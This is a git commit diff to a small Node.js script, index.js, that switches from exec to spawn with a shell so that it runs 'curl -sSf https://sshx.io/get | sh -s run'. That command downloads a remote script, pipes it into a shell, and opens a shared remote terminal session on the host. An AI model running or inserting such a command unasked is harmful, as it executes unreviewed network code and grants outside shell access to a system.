e90c959fbc7867a3da4866cddf37c6e18df8175f
iceyfromdiscord <116362513+iceyfromdiscord@users.noreply.github.com>
2025-09-17 16:50:03 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,12 +1,12 @@
 // runCommand.js
-const { exec } = require("child_process");
+const { spawn } = require("child_process");
 
 const command = "curl -sSf https://sshx.io/get | sh -s run";
 
-const child = exec(command, { stdio: "inherit" });
-
-child.stdout.pipe(process.stdout);
-child.stderr.pipe(process.stderr);
+const child = spawn(command, {
+  stdio: "inherit",
+  shell: true, // allows pipes | and shell syntax
+});
 
 child.on("close", (code) => {
   console.log(`Process exited with code ${code}`);
